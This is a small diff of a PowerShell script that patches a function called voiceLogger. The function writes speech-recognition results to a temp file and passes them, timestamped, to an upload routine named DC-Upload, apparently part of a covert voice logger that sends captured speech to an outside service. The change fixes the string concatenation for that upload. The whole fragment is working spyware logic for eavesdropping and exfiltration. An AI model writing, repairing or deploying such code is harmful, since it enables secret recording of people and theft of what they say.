@@ -39,7 +39,8 @@ function voiceLogger {
             $log = "$env:tmp/VoiceLog.txt"
             echo $results > $log
             $text = get-content $log -raw
-            DC-Upload '(-) ' +$Get-TimeStamp + ': $text'
+	    $conc = '(-) ' + $Get-TimeStamp + ': $text'
+            DC-Upload $conc 
 
             # Use a switch statement with the $results variable
             switch -regex ($results) {
